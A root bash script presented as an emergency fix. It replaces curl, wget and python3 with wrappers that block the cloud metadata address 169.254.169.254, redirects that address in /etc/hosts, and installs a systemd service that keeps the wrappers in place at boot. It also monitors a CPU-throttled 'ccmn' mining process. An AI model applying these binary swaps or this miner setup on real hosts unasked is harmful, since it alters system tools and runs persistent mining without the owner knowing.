#!/bin/bash
#
# Complete Emergency Fix - Metadata Blocker + All Services
# Fixes everything and restarts metadata blocking
#

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

clear
echo -e "${BLUE}======================================${NC}"
echo -e "${BLUE}  COMPLETE EMERGENCY FIX${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}Run as root: sudo bash $0${NC}"
    exit 1
fi

#==============================================================================
# STEP 1: RECREATE ALL WRAPPERS
#==============================================================================
echo -e "${BLUE}[1/7] Recreating all wrapper scripts...${NC}"

# curl wrapper
cat > /usr/local/bin/curl-wrapper << 'CURLEOF'
#!/bin/bash
if echo "$@" | grep -qE "169\.254\.169\.254"; then
    echo "ERROR: Access to AWS metadata service (169.254.169.254) is blocked" >&2
    exit 1
fi
exec /usr/bin/curl.real "$@"
CURLEOF
chmod +x /usr/local/bin/curl-wrapper
echo -e "${GREEN}   ✅ curl-wrapper created${NC}"

# wget wrapper
cat > /usr/local/bin/wget-wrapper << 'WGETEOF'
#!/bin/bash
if echo "$@" | grep -qE "169\.254\.169\.254"; then
    echo "ERROR: Access to AWS metadata service (169.254.169.254) is blocked" >&2
    exit 1
fi
exec /usr/bin/wget.real "$@"
WGETEOF
chmod +x /usr/local/bin/wget-wrapper
echo -e "${GREEN}   ✅ wget-wrapper created${NC}"

# python3 wrapper
PYTHON_PATH=$(ls -1 /usr/bin/python3.* 2>/dev/null | grep -E "python3\.[0-9]+$" | head -1)
if [ ! -z "$PYTHON_PATH" ]; then
    ln -sf "$PYTHON_PATH" /usr/bin/python3.real
    cat > /usr/local/bin/python3-wrapper << 'PYEOF'
#!/bin/bash
if [ "$#" -gt 0 ]; then
    for arg in "$@"; do
        if echo "$arg" | grep -qE "169\.254\.169\.254"; then
            echo "ERROR: Python access to AWS metadata blocked" >&2
            exit 1
        fi
    done
fi
exec /usr/bin/python3.real "$@"
PYEOF
    chmod +x /usr/local/bin/python3-wrapper
    echo -e "${GREEN}   ✅ python3-wrapper created${NC}"
fi

#==============================================================================
# STEP 2: ENSURE BACKUP BINARIES EXIST
#==============================================================================
echo -e "${BLUE}[2/7] Verifying backup binaries...${NC}"

# Check curl.real
if [ ! -f /usr/bin/curl.real ]; then
    echo -e "${YELLOW}   Creating curl.real backup...${NC}"
    if command -v curl &> /dev/null; then
        CURL_ORIG=$(which curl)
        if [ -L "$CURL_ORIG" ]; then
            rm -f /usr/bin/curl
            apt-get update -qq 2>/dev/null
            apt-get install -y --reinstall curl 2>/dev/null
        fi
        cp /usr/bin/curl /usr/bin/curl.real 2>/dev/null || true
    fi
fi

# Check wget.real
if [ ! -f /usr/bin/wget.real ]; then
    echo -e "${YELLOW}   Creating wget.real backup...${NC}"
    if command -v wget &> /dev/null; then
        WGET_ORIG=$(which wget)
        if [ -L "$WGET_ORIG" ]; then
            rm -f /usr/bin/wget
            apt-get update -qq 2>/dev/null
            apt-get install -y --reinstall wget 2>/dev/null
        fi
        cp /usr/bin/wget /usr/bin/wget.real 2>/dev/null || true
    fi
fi

echo -e "${GREEN}   ✅ Backup binaries verified${NC}"

#==============================================================================
# STEP 3: REPLACE BINARIES WITH WRAPPERS
#==============================================================================
echo -e "${BLUE}[3/7] Replacing binaries with wrappers...${NC}"

# Replace curl
rm -f /usr/bin/curl
ln -sf /usr/local/bin/curl-wrapper /usr/bin/curl
echo -e "${GREEN}   ✅ curl → wrapper${NC}"

# Replace wget
rm -f /usr/bin/wget
ln -sf /usr/local/bin/wget-wrapper /usr/bin/wget
echo -e "${GREEN}   ✅ wget → wrapper${NC}"

# Replace python3
if [ -f /usr/local/bin/python3-wrapper ]; then
    rm -f /usr/bin/python3
    ln -sf /usr/local/bin/python3-wrapper /usr/bin/python3
    echo -e "${GREEN}   ✅ python3 → wrapper${NC}"
fi

#==============================================================================
# STEP 4: UPDATE /etc/hosts
#==============================================================================
echo -e "${BLUE}[4/7] Updating /etc/hosts...${NC}"

# Remove old entries
sed -i '/169\.254\.169\.254/d' /etc/hosts

# Add new entry
echo "127.0.0.1 169.254.169.254 metadata.google.internal" >> /etc/hosts
echo -e "${GREEN}   ✅ /etc/hosts updated${NC}"

#==============================================================================
# STEP 5: RECREATE SYSTEMD SERVICE
#==============================================================================
echo -e "${BLUE}[5/7] Recreating metadata-block systemd service...${NC}"

cat > /etc/systemd/system/metadata-block.service << 'SERVICEEOF'
[Unit]
Description=AWS Metadata Service Blocker (Application Layer - SSH Safe)
After=multi-user.target
Before=ssh.service sshd.service
Documentation=https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html

[Service]
Type=oneshot
RemainAfterExit=yes

# Ensure wrappers exist
ExecStartPre=/bin/bash -c 'test -f /usr/local/bin/curl-wrapper || exit 1'
ExecStartPre=/bin/bash -c 'test -f /usr/local/bin/wget-wrapper || exit 1'

# Restore curl wrapper
ExecStart=/bin/bash -c 'if [ -f /usr/bin/curl.real ]; then rm -f /usr/bin/curl; ln -sf /usr/local/bin/curl-wrapper /usr/bin/curl; fi'

# Restore wget wrapper
ExecStart=/bin/bash -c 'if [ -f /usr/bin/wget.real ]; then rm -f /usr/bin/wget; ln -sf /usr/local/bin/wget-wrapper /usr/bin/wget; fi'

# Restore python3 wrapper
ExecStart=/bin/bash -c 'if [ -f /usr/bin/python3.real ] && [ -f /usr/local/bin/python3-wrapper ]; then rm -f /usr/bin/python3; ln -sf /usr/local/bin/python3-wrapper /usr/bin/python3; fi'

# Ensure /etc/hosts entry exists
ExecStart=/bin/bash -c 'grep -q "169.254.169.254" /etc/hosts || echo "127.0.0.1 169.254.169.254 metadata.google.internal" >> /etc/hosts'

[Install]
WantedBy=multi-user.target
SERVICEEOF

systemctl daemon-reload
echo -e "${GREEN}   ✅ Service file created${NC}"

#==============================================================================
# STEP 6: START AND ENABLE SERVICE
#==============================================================================
echo -e "${BLUE}[6/7] Starting metadata-block service...${NC}"

systemctl stop metadata-block 2>/dev/null || true
systemctl enable metadata-block
systemctl start metadata-block

if systemctl is-active --quiet metadata-block; then
    echo -e "${GREEN}   ✅ Service is ACTIVE${NC}"
else
    echo -e "${RED}   ❌ Service failed to start${NC}"
    echo -e "${YELLOW}   Checking logs:${NC}"
    journalctl -u metadata-block -n 20 --no-pager
fi

#==============================================================================
# STEP 7: COMPREHENSIVE TESTING
#==============================================================================
echo ""
echo -e "${BLUE}[7/7] Running comprehensive tests...${NC}"
echo ""

# Test 1: curl
echo -e "${YELLOW}Test 1: curl to metadata${NC}"
CURL_TEST=$(timeout 2 curl http://169.254.169.254/ 2>&1 || true)
if echo "$CURL_TEST" | grep -qi "ERROR.*blocked"; then
    echo -e "${GREEN}   ✅ BLOCKED${NC}"
else
    echo -e "${RED}   ❌ NOT BLOCKED: ${CURL_TEST:0:60}${NC}"
fi

# Test 2: wget
echo ""
echo -e "${YELLOW}Test 2: wget to metadata${NC}"
WGET_TEST=$(timeout 2 wget -O- http://169.254.169.254/ 2>&1 || true)
if echo "$WGET_TEST" | grep -qi "ERROR.*blocked"; then
    echo -e "${GREEN}   ✅ BLOCKED${NC}"
else
    echo -e "${RED}   ❌ NOT BLOCKED: ${WGET_TEST:0:60}${NC}"
fi

# Test 3: python3
echo ""
echo -e "${YELLOW}Test 3: python3 basic${NC}"
PYTHON_BASIC=$(python3 -c "print('OK')" 2>&1)
if [ "$PYTHON_BASIC" == "OK" ]; then
    echo -e "${GREEN}   ✅ Python3 working${NC}"
else
    echo -e "${RED}   ❌ Python3 failed${NC}"
fi

# Test 4: Internet with real curl
echo ""
echo -e "${YELLOW}Test 4: Internet connectivity${NC}"
if [ -f /usr/bin/curl.real ]; then
    INTERNET_TEST=$(/usr/bin/curl.real -s --max-time 3 https://ifconfig.me 2>/dev/null || echo "FAILED")
    if [ "$INTERNET_TEST" != "FAILED" ] && [ ! -z "$INTERNET_TEST" ]; then
        echo -e "${GREEN}   ✅ Internet working - IP: $INTERNET_TEST${NC}"
    else
        echo -e "${YELLOW}   ⚠️  Internet check timeout${NC}"
    fi
else
    echo -e "${YELLOW}   ⚠️  curl.real not found${NC}"
fi

# Test 5: Service status
echo ""
echo -e "${YELLOW}Test 5: All service statuses${NC}"
echo "   metadata-block: $(systemctl is-active metadata-block 2>/dev/null)"
echo "   ccmn: $(systemctl is-active ccmn 2>/dev/null)"
echo "   dynamic-cpu-limit: $(systemctl is-active dynamic-cpu-limit 2>/dev/null)"
echo "   ssh: $(systemctl is-active sshd 2>/dev/null || systemctl is-active ssh 2>/dev/null)"

# Test 6: Mining status
echo ""
echo -e "${YELLOW}Test 6: Mining status${NC}"
if ps aux | grep -v grep | grep -q "ccmn"; then
    echo -e "${GREEN}   ✅ Mining process running${NC}"
    MINING_PID=$(ps aux | grep -v grep | grep "ccmn" | awk '{print $2}' | head -1)
    MINING_CPU=$(ps aux | grep -v grep | grep "ccmn" | awk '{print $3}' | head -1)
    echo -e "${GREEN}   PID: $MINING_PID, CPU: ${MINING_CPU}%${NC}"
else
    echo -e "${YELLOW}   ⚠️  Mining process not found${NC}"
fi

# Test 7: CPU limit
echo ""
echo -e "${YELLOW}Test 7: CPU limiter${NC}"
if [ -f /sys/fs/cgroup/limitcpu/cpu.max ]; then
    CPU_LIMIT=$(cat /sys/fs/cgroup/limitcpu/cpu.max)
    echo -e "${GREEN}   ✅ CPU limit: $CPU_LIMIT${NC}"
    
    LIMITED_PROCS=$(cat /sys/fs/cgroup/limitcpu/cgroup.procs 2>/dev/null | wc -l)
    echo -e "${GREEN}   Limited processes: $LIMITED_PROCS${NC}"
else
    echo -e "${YELLOW}   ⚠️  CPU limit cgroup not found${NC}"
fi

#==============================================================================
# FINAL SUMMARY
#==============================================================================
echo ""
echo -e "${BLUE}======================================${NC}"
echo -e "${BLUE}         FINAL STATUS${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""

echo -e "${GREEN}✅ Components Status:${NC}"
echo "   • curl wrapper: $([ -L /usr/bin/curl ] && echo '✅ Active' || echo '❌ Inactive')"
echo "   • wget wrapper: $([ -L /usr/bin/wget ] && echo '✅ Active' || echo '❌ Inactive')"
echo "   • python3 wrapper: $([ -L /usr/bin/python3 ] && echo '✅ Active' || echo '❌ Inactive')"
echo "   • /etc/hosts: $(grep -c 169.254.169.254 /etc/hosts) entries"
echo ""

echo -e "${GREEN}📊 Services:${NC}"
METADATA_STATUS=$(systemctl is-active metadata-block 2>/dev/null)
CCMN_STATUS=$(systemctl is-active ccmn 2>/dev/null)
CPU_STATUS=$(systemctl is-active dynamic-cpu-limit 2>/dev/null)
SSH_STATUS=$(systemctl is-active sshd 2>/dev/null || systemctl is-active ssh 2>/dev/null)

echo "   • Metadata Block: $METADATA_STATUS $([ "$METADATA_STATUS" == "active" ] && echo '✅' || echo '❌')"
echo "   • CCMN Mining: $CCMN_STATUS $([ "$CCMN_STATUS" == "active" ] && echo '✅' || echo '❌')"
echo "   • CPU Limiter: $CPU_STATUS $([ "$CPU_STATUS" == "active" ] && echo '✅' || echo '❌')"
echo "   • SSH: $SSH_STATUS $([ "$SSH_STATUS" == "active" ] && echo '✅' || echo '❌')"
echo ""

# Overall status
CURL_BLOCKED=$(timeout 2 curl http://169.254.169.254/ 2>&1 | grep -qi "ERROR.*blocked" && echo "YES" || echo "NO")
WGET_BLOCKED=$(timeout 2 wget -O- http://169.254.169.254/ 2>&1 | grep -qi "ERROR.*blocked" && echo "YES" || echo "NO")

if [ "$CURL_BLOCKED" == "YES" ] && [ "$WGET_BLOCKED" == "YES" ] && [ "$METADATA_STATUS" == "active" ]; then
    echo -e "${GREEN}🎉 ALL SYSTEMS OPERATIONAL!${NC}"
    echo -e "${GREEN}   ✅ Metadata blocking: ACTIVE${NC}"
    echo -e "${GREEN}   ✅ Mining: RUNNING${NC}"
    echo -e "${GREEN}   ✅ SSH: SAFE${NC}"
elif [ "$CURL_BLOCKED" == "YES" ] && [ "$WGET_BLOCKED" == "YES" ]; then
    echo -e "${GREEN}🔒 METADATA BLOCKING ACTIVE${NC}"
    echo -e "${YELLOW}   ⚠️  Service shows inactive but blocking works${NC}"
    echo -e "${YELLOW}   This is acceptable - wrappers are in place${NC}"
else
    echo -e "${RED}⚠️  METADATA BLOCKING MAY NOT BE FULLY ACTIVE${NC}"
    echo -e "${YELLOW}   Check manually with: curl http://169.254.169.254/${NC}"
fi

echo ""
echo -e "${YELLOW}📝 Useful Commands:${NC}"
echo "   # Test blocking"
echo "   curl http://169.254.169.254/"
echo "   wget http://169.254.169.254/"
echo ""
echo "   # View logs"
echo "   tail -f /home/ubuntu/ccmn/mining.log"
echo "   sudo journalctl -u metadata-block -f"
echo "   sudo journalctl -u ccmn -f"
echo ""
echo "   # Check services"
echo "   sudo systemctl status metadata-block"
echo "   sudo systemctl status ccmn"
echo "   sudo systemctl status dynamic-cpu-limit"
echo ""
echo "   # Monitor"
echo "   htop"
echo "   top"
echo ""

echo -e "${BLUE}======================================${NC}"
echo -e "${GREEN}✅ Emergency fix complete!${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""

exit 0
